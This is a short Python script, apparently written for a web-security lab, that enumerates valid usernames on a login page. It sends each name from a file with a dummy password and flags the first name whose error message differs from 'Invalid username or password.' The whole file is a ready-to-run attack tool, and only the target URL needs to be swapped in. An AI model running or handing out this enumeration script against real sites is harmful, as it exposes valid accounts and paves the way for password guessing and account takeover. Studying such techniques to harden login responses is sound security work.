import requests

# Replace with the URL you want to send the request to, should be end with /login
url = "https://www.example.com/login"

# save the user names in a file called usernames.txt
file_path = 'usernames.txt'
message='Invalid username or password.'

# Open the file in read mode
with open(file_path, 'r') as file:
    # Read each line from the file
    for line in file:
        user = line.strip()
    
        data = {
        'username': user,
        'password': '123'
        }
        response = requests.post(url, data=data)
        text = response.text
    
        # Extract part of the text (for example, text between two markers)
        start_marker = '<p class=is-warning>'
        end_marker = '</p>'
    
        start_index = text.find(start_marker)
        end_index = text.find(end_marker, start_index)
    
        if start_index != -1 and end_index != -1:
          extracted_text = text[start_index + len(start_marker):end_index]
          if extracted_text!=message:
             print(user)
             break